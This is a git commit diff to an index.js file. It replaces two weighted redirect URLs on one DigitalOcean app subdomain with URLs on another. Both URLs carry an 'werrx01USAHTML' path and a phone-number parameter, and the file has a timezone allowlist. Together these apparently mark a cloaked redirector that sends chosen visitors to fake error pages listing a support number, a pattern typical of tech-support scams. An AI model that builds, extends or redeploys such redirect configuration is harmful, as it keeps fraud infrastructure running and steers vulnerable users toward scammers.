9fa2f0ce066e9a91d0a8c89de080eadb5a4957a3
paalakash <palaksh452@gmail.com>
2026-06-04 07:20:17 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://lionfish-app-fqyu4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 },
-    { url: "https://lionfish-app-fqyu4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 }
+    { url: "https://stingray-app-ubg8g.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 },
+    { url: "https://stingray-app-ubg8g.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 }
 
 ];
 
